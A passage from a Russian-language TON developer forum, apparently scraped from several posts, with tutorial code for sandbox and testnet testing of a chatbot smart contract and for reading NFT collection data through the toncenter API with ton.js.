import { Cell, Address, toNano, beginCell } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";
import { flattenTransaction } from "@ton-community/test-utils";



describe("msg test", () => {
	it("test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));

		expect(sentMessageResult.transactions).toHaveTransaction({
			from: senderWallet.address,
			to: myContract.address,
			success: true,
		});

		//const arr = sentMessageResult.transactions.map(tx => flattenTransaction(tx));

		let reply = beginCell().storeUint(0, 32).storeStringTail("reply").endCell();

		expect(sentMessageResult.transactions).toHaveTransaction({
			body: reply,
			from: myContract.address,
			to: senderWallet.address
		});

	});
});
```

Запустите тесты с помощью команды `yarn test` и увидите, что все работает. Таким образом мы можем в тестах собирать объекты такие же как в смарт-контракте и проверять, что транзакция была.

## [](#onchain-3)Onchain тесты

Иногда может возникнуть ситуация, что вам надо прогнать работу ваших смарт-контрактов в тестовой сети(ситуация когда контрактов очень много). Попробуем сделать это на нашем примере.

В папке `scripts` сделаем файл `onchain.ts`, для удобства запуска, добавим в `package.json` `"onchain": "ts-node ./scripts/onchain.ts"`:

```
  "scripts": {
	"compile": "ts-node ./scripts/compile.ts",
	"test": "yarn jest",
	"deploy": "yarn compile && ts-node ./scripts/deploy.ts",
	"onchain": "ts-node ./scripts/onchain.ts"
  },
```

Первое, что нам понадобиться для тестов, это адрес смарт-контракта, соберем его:

```
import { Cell, beginCell, contractAddress, toNano} from "ton-core";
import { hex } from "../build/main.compiled.json";
import { TonClient } from "ton";

async function onchainScript() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();

	const address = contractAddress(0,{
		code: codeCell,
		data: dataCell,
	});

	console.log("Address: ",address)

}
```

Тест для тестовой сети, будет предлагать нам задеплоить траназакцию через QR код в наш смарт-контракт и каждые 10 секунд проверять появилась ли ответ в сети.

> Это конечно же упрощения для примера, суть просто показать логику.

Соберем QR код, по которому мы будем проводить траназакцию через Tonkeeper. Для нашего примера, важно, чтобы количество TON было достаточным, чтобы не вызывать исключение записанное в контракте.

```
import { Cell, beginCell, contractAddress, toNano} from "ton-core";
import { hex } from "../build/main.compiled.json";
import { TonClient } from "ton";
import qs from "qs";
import qrcode from "qrcode-terminal";

async function onchainScript() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();

	const address = contractAddress(0,{
		code: codeCell,
		data: dataCell,
	});

	console.log("Address: ",address)

	let transactionLink =
	'https://app.tonkeeper.com/transfer/' +
	address.toString({
		testOnly: true,
	}) +
	"?" +
	qs.stringify({
		text: "Sent simple in",
		amount: toNano("0.6").toString(10),
	});

	console.log("Transaction link:",transactionLink);


	qrcode.generate(transactionLink, {small: true }, (qr) => {
		console.log(qr);
	});

}

onchainScript();
```

Чтобы получать данные из тестовой сети нам нужен какой-то источник данных. Данные можно получить по ADNL от Liteservers, но о ADNL поговорим в следующих туториалах. В данном туториале воспользуем API TON центра.

```
	const API_URL = "https://testnet.toncenter.com/api/v2"
```

Запросы будем делать через Http-клиент [axios](https://axios-http.com/ru/docs/intro), установим: `yarn add axios`.

Среди методов Toncenter, нам нужен getTransactions c параметром limit 1, т.е будем брать последнюю транзакцию. Напишем две вспомогательные функции для запроса информации:

```
// axios http client // yarn add axios
async function getData(url: string): Promise<any> {
	try {
	  const config: AxiosRequestConfig = {
		url: url,
		method: "get",
	  };
	  const response: AxiosResponse = await axios(config);
	  //console.log(response)
	  return response.data.result;
	} catch (error) {
	  console.error(error);
	  throw error;
	}
  }

async function getTransactions(address: String) {
  var transactions;
  try {
	transactions = await getData(
	  `${API_URL}/getTransactions?address=${address}&limit=1`
	);
  } catch (e) {
	console.error(e);
  }
  return transactions;
}
```

Теперь нам нужна функция, которая будет с интервалом вызывать API, для этого есть удобный метод [SetInterval](https://developer.mozilla.org/docs/Web/API/setInterval):

```
import { Cell, beginCell, contractAddress, toNano} from "ton-core";
import { hex } from "../build/main.compiled.json";
import { TonClient } from "ton";
import qs from "qs";
import qrcode from "qrcode-terminal";
import axios, { AxiosRequestConfig, AxiosResponse } from "axios";


const API_URL = "https://testnet.toncenter.com/api/v2"

	// axios http client // yarn add axios
async function getData(url: string): Promise<any> {
	try {
	  const config: AxiosRequestConfig = {
		url: url,
		method: "get",
	  };
	  const response: AxiosResponse = await axios(config);
	  //console.log(response)
	  return response.data.result;
	} catch (error) {
	  console.error(error);
	  throw error;
	}
  }

async function getTransactions(address: String) {
  var transactions;
  try {
	transactions = await getData(
	  `${API_URL}/getTransactions?address=${address}&limit=1`
	);
  } catch (e) {
	console.error(e);
  }
  return transactions;
}

async function onchainScript() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();

	const address = contractAddress(0,{
		code: codeCell,
		data: dataCell,
	});


	console.log("Address: ",address)

	let transactionLink =
	'https://app.tonkeeper.com/transfer/' +
	address.toString({
		testOnly: true,
	}) +
	"?" +
	qs.stringify({
		text: "Sent simple in",
		amount: toNano("0.6").toString(10),
		//bin: beginCell().storeUint(1,32).endCell().toBoc({idx: false}).toString("base64"),
	});

	console.log("Transaction link:",transactionLink);


	qrcode.generate(transactionLink, {small: true }, (qr) => {
		console.log(qr);
	});

	setInterval(async () => {
		const txes = await getTransactions(address.toString());
		if(txes[0].in_msg.source === "EQCj2gVRdFS0qOZnUFXdMliONgSANYXfQUDMsjd8fbTW-RuC") {

		}

	},10000)


}

onchainScript();
```

Здесь важно отметить, что API отдает транзакции, а не сообщения, соответственно нам надо проверить, что IN пришло адреса нашего кошелька(здесь я его просто захардкодил) и сообщение(которое мы положили под QR), а в OUT вывести cообщение первого сообщения. Также выведем дату, получим:

```
import { Cell, beginCell, contractAddress, toNano} from "ton-core";
import { hex } from "../build/main.compiled.json";
import { TonClient } from "ton";
import qs from "qs";
import qrcode from "qrcode-terminal";
import axios, { AxiosRequestConfig, AxiosResponse } from "axios";


const API_URL = "https://testnet.toncenter.com/api/v2"

	// axios http client // yarn add axios
async function getData(url: string): Promise<any> {
	try {
	  const config: AxiosRequestConfig = {
		url: url,
		method: "get",
	  };
	  const response: AxiosResponse = await axios(config);
	  //console.log(response)
	  return response.data.result;
	} catch (error) {
	  console.error(error);
	  throw error;
	}
  }

async function getTransactions(address: String) {
  var transactions;
  try {
	transactions = await getData(
	  `${API_URL}/getTransactions?address=${address}&limit=1`
	);
  } catch (e) {
	console.error(e);
  }
  return transactions;
}

async function onchainScript() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();

	const address = contractAddress(0,{
		code: codeCell,
		data: dataCell,
	});


	console.log("Address: ",address)

	let transactionLink =
	'https://app.tonkeeper.com/transfer/' +
	address.toString({
		testOnly: true,
	}) +
	"?" +
	qs.stringify({
		text: "Sent simple in",
		amount: toNano("0.6").toString(10),
		//bin: beginCell().storeUint(1,32).endCell().toBoc({idx: false}).toString("base64"),
	});

	console.log("Transaction link:",transactionLink);


		qrcode.generate(transactionLink, {small: true }, (qr) => {
			console.log(qr);
		});

		setInterval(async () => {
			const txes = await getTransactions(address.toString());
			if(txes[0].in_msg.source === "EQCj2gVRdFS0qOZnUFXdMliONgSANYXfQUDMsjd8fbTW-RuC") {

            	console.log("Last tx: " + new Date(txes[0].utime * 1000))
            	console.log("IN from: "+ txes[0].in_msg.source+" with msg: "+ txes[0].in_msg.message)
            	console.log("OUT from: "+ txes[0].out_msgs[0].source +" with msg: "+ txes[0].out_msgs[0].message)
			}

		},10000)


	}

	onchainScript();
```

Запускаем командой `yarn onchain`, сканируем QR, отправляем траназакцию и ждем, когда придет наша траназакция.

## [](#h-4)Заключение

Надеюсь вам понравилсь серия про pipeline. Буду благодарен звездочке на репозитории.

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/chatbottest.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/pipeline/chatbottest.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/chatbottest.md)

````
# Chatbot Smart Contract Testing

В данном туториале мы напишем тесты для смарт-контракта чат-бота. Основная задача, научиться рассматривать под лупой транзакции в `@ton-community/sandbox`, а также разобрать как делать тесты в тестовой сети или другими словами onchain тесты.

Начнем с обычных тестов.

## Проверяем есть ли траназакция 

Так как мы используем проект предыдущего туториала как шаблон, каркас тестов у нас уже есть, откроем файл `main.spec.ts` и удалим оттуда, все что касается GET метода:

```ts
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";

describe("test tests", () => {
	it("test of test", async() => {
````

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/chatbottest.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 472

[TON Research](/)

# [Get-запросы в TON - Урок 1 Запросы в TON с помощью JS: достаем данные NFT](/t/get-ton-1-ton-js-nft/472)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:56pm  1

# [](#ton-js-nft-1)Запросы в TON с помощью JS: достаем данные NFT

Часто Web3 приложения или Dapps выглядят архитектурно выглядят как Фронтенд, который вызывает методы смарт-контрактов. Соответственно нужно уметь делать запросы на JS в блокчейн. В TON мало примеров на JS, поэтому я решил сделать небольшой наглядный туториал.

## [](#h-2)Вступление

Web 3 приложения часто строятся вокруг стандартов, существующих в блокчейне, в TON это NFT и Jetton. Для стандарта NFT распространенной задачей является получение адресов NFT конкретной коллекции. Поэтому в данном туториале:

*   мы достаем данные об NFT коллекции
*   получим адрес NFT по индексу

и все это на JS.

### [](#h-3)Устанавливаем библиотеки

Для запросов в TON нам понадобиться `typescript` и модулями для работы с TON.  
Для работы с Typescript нам понадобятся:

*   Node.js — среда, в которой вы будете запускать компилятор TypeScript.
*   Компилятор TypeScript — модуль Node.js, который компилирует TypeScript в JavaScript.

> Глубоко погружаться в Node.js мы не будем, инструкции по его установке есть [здесь](https://nodejs.org/en/download/):

Для удобства работы с модулями создадим файл `package.json` c помощью пакетного менеджера `npm`:

1.  В консоли перейдите в папку вашего проекта (где будем писать скрипты)
    
2.  Введите в консоли
    
    ```
    npm init
    ```
    
3.  Ответьте на вопросы в консоли и убедитесь, что файл `package.json` создан
    

Теперь установим `typescript`. В командной строке вводим следующую команду:

```
	npm install typescript
```

После установки вы можете ввести следующую команду, чтобы проверить текущую версию компилятора TypeScript:

```
	tsc --v
```

Также установим пакет ts-node для выполнения TypeScript в консоли и REPL для node.js.

```
	npm install  ts-node
```

Осталось установить модули для работы c TON:

```
	npm install ton ton-core ton-crypto
```

Отлично, теперь можно приступать к скриптам.

## [](#h-4)Достаем информацию о Коллекции

Чтобы получить информацию об NFT коллекции нам нужно вызвать GET-метод смарт-контракта коллекции, для этого надо:

*   использовать некий API сервис, который взаимодействует с Лайт серверами блокчейна TON
*   через этот клиент вызвать нужный GET-метод
*   преобразовать полученные данные в читаемый вид

В данном туториале мы воспользуемся [toncenter API](https://github.com/toncenter/ton-http-api), для запроса воспользуемся клиентом на js, библиотеки [ton.js](https://www.npmjs.com/package/ton).

Создадим скрипт `collection.ts`. Импортируем из библиотеки клиент:

```
import { TonClient } from 'ton';
```

И подключаемся к toncenter:

```
import { TonClient } from 'ton';

export const toncenter = new TonClient({
	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
});
```

> Для простоты примера мы не используем API ключ, поэтому мы будем лимитированы одним запросом в минуту, для создания ключа можете воспользоваться ботом [Telegram: Contact @tonapibot](https://t.me/tonapibot)

Теперь посмотрим в [стандарт NFT коллекций на TON](https://github.com/ton-blockchain/TEPs/blob/master/text/0062-nft-standard.md) для того, чтобы понять какой GET-метод нужно вызвать. По стандарту видно, что нам нужна функция `get_collection_data()`, которая вернет нам:

*   `next_item_index` — количество развернутых в данный момент элементов NFT в коллекции.
*   `collection_content` — содержимое коллекции в формате, соответствующем стандарту [TEP-64](https://github.com/ton-blockchain/TEPs/blob/master/text/0064-token-data-standard.md).
*   `owner_address` - адрес владельца коллекции, нулевой адрес, если нет владельца.

Воспользуемся синтаксическим сахаром `async/await` и вызовем данный метод для какой-нибудь коллекции в TON:

```
import { TonClient } from 'ton';

export const toncenter = new TonClient({
	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
});

export const nftCollectionAddress = Address.parse('UQApA79Qt8VEOeTfHu9yKRPdJ_dADvspqh5BqV87PgWD998f');

(async () => {
	let { stack } = await toncenter.callGetMethod(
		nftCollectionAddress, 
		'get_collection_data'
	);

})().catch(e => console.error(e));
```

Для преобразования данных в читаемый вид, воспользуемся библиотекой `ton-core`:

```
import { Address } from 'ton-core';
```

Преобразуем nextItemIndex в строку, вычитаем ячейку с контентом и преобразуем адрес:

```
import { TonClient } from 'ton';
import { Address } from 'ton-core';

export const toncenter = new TonClient({
	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
});

export const nftCollectionAddress = Address.parse('UQApA79Qt8VEOeTfHu9yKRPdJ_dADvspqh5BqV87PgWD998f');

(async () => {
	let { stack } = await toncenter.callGetMethod(
		nftCollectionAddress, 
		'get_collection_data'
	);
	let nextItemIndex = stack.readBigNumber();
	let contentRoot = stack.readCell();
	let owner = stack.readAddress();

	console.log('nextItemIndex', nextItemIndex.toString());
	console.log('contentRoot', contentRoot);
	console.log('owner', owner);
})().catch(e => console.error(e));
```

Запустим скрипт с помощью `ts-node`. Должно получиться следующее:

## [](#h-5)Достаем адрес элемента Коллекции по индексу

Теперь решим задачу по получению адреса по индексу, мы опять будем вызывать GET-метод смарт-контракта коллекции. В соответствии со стандартом, для этой задачи подходит метод `get_nft_address_by_index(int index)`, который возвращает `slice address`.

Данный метод принимает параметр `int index` и на первый взгляд выглядит так, как будто нужно просто передать значение с типом `int` в смарт-контракт. Это конечно так, но так как виртуальная машина TON использует регистры то значение с типом `int` нужно будет передать в кортеже. Для этого в библиотеке `ton.js` есть `TupleBuilder` .

```
import { TupleBuilder } from 'ton';
```

Запишем в кортеж значение 0:

```
import { TonClient } from 'ton';
import { Address } from 'ton-core';
import { TupleBuilder } from 'ton';

export const toncenter = new TonClient({
	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
});

export const nftCollectionAddress = Address.parse('EQDvRFMYLdxmvY3Tk-cfWMLqDnXF_EclO2Fp4wwj33WhlNFT');

(async () => {
	let args = new TupleBuilder();
	args.writeNumber(0);


})().catch(e => console.error(e));
```

Остается сделать запрос и преобразовать адрес с помощью `readAddress()`:

```
import { TonClient } from 'ton';
import { Address } from 'ton-core';
import { TupleBuilder } from 'ton';

export const toncenter = new TonClient({
	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
});

export const nftCollectionAddress = Address.parse('EQDvRFMYLdxmvY3Tk-cfWMLqDnXF_EclO2Fp4wwj33WhlNFT');

(async () => {
	let args = new TupleBuilder();
	args.writeNumber(0);

	let { stack } = await toncenter.callGetMethod(
		nftCollectionAddress, 
		'get_nft_address_by_index',
		args.build(),
	);
	let nftAddress = stack.readAddress();

	console.log('nftAddress', nftAddress.toString());
})().catch(e => console.error(e));
```

Запустим скрипт с помощью `ts-node`. Должно получиться следующее:

## [](#h-6)Заключение

Подобные разборы и туториалы я публикую в телеграм канале [Telegram: Contact @ton\_learn](https://t.me/ton_learn) буду рад вашей подписке.

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/requests/20lesson/tonjs.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/requests/20lesson/tonjs.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/requests/20lesson/tonjs.md)

```
# Запросы в TON с помощью JS: достаем данные NFT

Часто Web3 приложения или Dapps выглядят архитектурно выглядят как Фронтенд, который вызывает методы смарт-контрактов. Соответственно нужно уметь делать запросы на JS в блокчейн. В TON мало примеров на JS, поэтому я решил сделать небольшой наглядный туториал.

## Вступление

Web 3 приложения часто строятся вокруг стандартов, существующих в блокчейне, в TON это NFT и Jetton. Для стандарта NFT распространенной задачей является получение адресов NFT конкретной коллекции. Поэтому в данном туториале:

 - мы достаем данные об NFT коллекции
 - получим адрес NFT по индексу
 
и все это на JS.

### Устанавливаем библиотеки

Для запросов в TON нам понадобиться `typescript` и модулями для работы с TON.
Для работы с Typescript нам понадобятся:
- Node.js — среда, в которой вы будете запускать компилятор TypeScript.
- Компилятор TypeScript — модуль Node.js, который компилирует TypeScript в JavaScript.

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/requests/20lesson/tonjs.md)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 473

[TON Research](/)

# [Get-запросы в TON - Урок 2 ADNL Intro](/t/get-ton-2-adnl-intro/473)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:56pm  1

# [](#adnl-intro-1)ADNL Intro

